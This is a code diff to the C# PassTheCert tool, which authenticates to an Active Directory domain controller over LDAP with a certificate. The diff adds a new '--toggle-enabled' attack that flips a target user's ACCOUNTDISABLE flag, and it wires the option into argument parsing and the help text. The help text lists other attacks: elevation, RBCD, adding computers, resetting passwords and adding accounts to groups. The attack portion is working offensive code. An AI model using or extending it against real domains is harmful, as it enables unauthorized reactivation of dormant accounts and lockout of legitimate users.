@@ -342,6 +342,44 @@ namespace PassTheCert
             ModifyAttribute(connection, target, "member", System.Text.Encoding.Unicode.GetBytes(account), true, DirectoryAttributeOperation.Add);
         }
 
+        static void ToggleAccountStatus(LdapConnection connection, string userDn)
+        {
+            {
+                // Search for the current userAccountControl value
+                SearchRequest searchRequest = new SearchRequest(userDn, "(objectClass=user)", SearchScope.Base, "userAccountControl");
+                SearchResponse searchResponse = (SearchResponse)connection.SendRequest(searchRequest);
+                SearchResultEntry entry = searchResponse.Entries[0];
+                int userAccountControl = int.Parse((string)entry.Attributes["userAccountControl"][0]);
+
+                // Define the flag for 'ACCOUNTDISABLE'
+                const int ACCOUNTDISABLE = 0x0002;
+
+                // Toggle the 'ACCOUNTDISABLE' flag
+                if ((userAccountControl & ACCOUNTDISABLE) > 0)
+                {
+                    // Currently disabled, enable the account
+                    userAccountControl &= ~ACCOUNTDISABLE;
+                }
+                else
+                {
+                    // Currently enabled, disable the account
+                    userAccountControl |= ACCOUNTDISABLE;
+                }
+
+                // Prepare the modification request
+                DirectoryAttributeModification modification = new DirectoryAttributeModification();
+                modification.Operation = DirectoryAttributeOperation.Replace;
+                modification.Name = "userAccountControl";
+                modification.Add(userAccountControl.ToString());
+
+                ModifyRequest modifyRequest = new ModifyRequest(userDn, modification);
+
+                // Send the modification request
+                ModifyResponse modifyResponse = (ModifyResponse)connection.SendRequest(modifyRequest);
+                Console.WriteLine($"Account status toggled. Result: {modifyResponse.ResultCode}");
+            }
+        }
+
         static void PrintHelp(int exit_code)
         {
             Console.WriteLine("PassTheCert.exe [--help] --server DOMAIN_CONTROLLER [--start-tls] --cert-path CERT_PATH [--cert-password CERT_PASSWORD] (--elevate|--rbcd|--add-computer|--reset-password|--add-account-to-group) [ATTACK_OPTIONS]");
@@ -404,6 +442,10 @@ namespace PassTheCert
             Console.WriteLine("\t\tTarget of the attack. Should be the distinguished name of the group.");
             Console.WriteLine("\t--account ACCOUNT");
             Console.WriteLine("\t\tThe account added to the group. Should be the distinguished name of the account.");
+            Console.WriteLine("\n\n");
+            Console.WriteLine("TOGGLE ENABLE USER ACCOUNT OPTIONS: --target TARGET --toggle-enabled");
+            Console.WriteLine("\t--target TARGET");
+            Console.WriteLine("\t\tTarget of the attack. Should be the distinguished name of the user account.");
             Console.WriteLine("\n\n");
             Console.WriteLine("Examples:\n");
             Console.WriteLine("PassTheCert.exe --server ad.contoso.com --cert-path C:\\exchange_server.pfx --elevate --target DC=contoso,DC=com --sid S-1-5-21-453406510-812318184-4183662089-1337");
@@ -486,6 +528,9 @@ namespace PassTheCert
                     case "--reset-password":
                         attack_type = "reset_password";
                         break;
+                    case "--toggle-enabled":
+                        attack_type = "toggle_enabled";
+                        break;
                     case "--add-account-to-group":
                         attack_type = "add_account_to_group";
                         break;
@@ -526,7 +571,6 @@ namespace PassTheCert
                 Console.WriteLine("Missing mandatory argument (--server or --cert-path)");
                 PrintHelp(1);
             }
-
             int port = start_tls ? 389 : 636;
             LdapDirectoryIdentifier server = new LdapDirectoryIdentifier(domain_controller, port);
             X509Certificate2 certificate = new X509Certificate2(cert_path, cert_password, X509KeyStorageFlags.Exportable);
@@ -566,6 +610,9 @@ namespace PassTheCert
                     break;
                 case "add_account_to_group":
                     AddAccountToGroupAttack(connection, target, account);
+                    break;
+                case "toggle_enabled":
+                    ToggleAccountStatus(connection, target);
                     break;
                 default:
                     Console.WriteLine("Attack type not supported, choose one between --elevate, --rbcd, --add-computer, --reset-password, and --add-account-to-group.\n");
